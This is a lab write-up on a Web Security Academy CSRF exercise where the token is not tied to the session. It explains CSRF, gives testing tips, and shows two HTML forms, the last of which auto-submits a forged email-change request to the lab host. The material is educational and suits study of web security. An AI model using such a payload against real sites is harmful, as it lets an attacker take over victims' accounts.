# 🧠 Lab Title: CSRF Where Token Is Not Tied to User Session

## 🔍 Category

Broken Access Control

## 🎯 Objective

> Change the viewer's email address

## 🧰 Tools Used

* Burp Suite

## 🚀 Exploitation Steps

#### Observe the description

Before we begin, **what is CSRF?**
Cross-Site Request Forgery (CSRF) is a web security vulnerability that allows an attacker to force a user to perform actions they did not intend to perform.

For CSRF to be possible, three things must exist:

1. **Relevant action:** There is an action within the application that the attacker has a reason to induce. This could be a privileged action (e.g., modifying permissions for other users) or any action on user-specific data (e.g., changing the user's own password).

2. **Cookie-based session handling:** Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user. There is no other mechanism for tracking sessions or validating user requests.

3. **No unpredictable request parameters:** The requests performing the action do not contain parameters whose values the attacker cannot determine or guess. For example, a function is **not vulnerable** if the attacker needs to know the existing password to change it.

**Testing tips:**

* Remove the CSRF token and see if the application accepts the request.
* Change the request from GET to POST.
* Check if the CSRF token is valid.
* Check if the CSRF token is tied to the user session. A correctly implemented CSRF token must be linked to a specific user session.

For testing, we will use **two accounts**.

For more information, visit [PortSwigger CSRF Guide](https://portswigger.net/web-security/csrf).

#### Access the lab

> Click on `ACCESS THE LAB`

#### START HACKING!!!

1. Open Burp Suite and log in with the given credentials (Account A).

2. Intercept the request for "change email."

3. Log in to another account (Account B).

4. Obtain the CSRF token from the web developer tools.

5. Copy the CSRF token from Account A and use it in Account B. If you receive a **302 FOUND** status code, the CSRF is valid.

This confirms the vulnerability. Now, we can copy the elements from the “change email” form and put them in the exploit server:

```html
<form class="login-form" name="change-email-form" action="https://YOUR-LAB.web-security-academy.net/my-account/change-email" method="POST">
    <label>Email</label>
    <input required="" type="email" name="email" value="">
    <input required="" type="hidden" name="csrf" value="I1FWBmIo0TLWJLMJQhcBRFjRu45jUP4e">
    <button class="button" type="submit">Update email</button>
</form>
```

6. Change the email address in the exploit so it does not match your own.

7. Test it: store this HTML, add another email, and the email will be updated to the submitted value.

To fully solve the lab, update the CSRF value and the lab ID here:

```html
<form method="POST" action="https://0a2300f90330f7ec80ebcbb700830054.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="test@tests.com">
    <input required="" type="hidden" name="csrf" value="EIbXOGEODH4HKTbuW1HK5A2b3fQnymQn">
</form>
<script>
    document.forms[0].submit();
</script>
```

## 🧵 Reflection

> What is CSRF and how to test for them
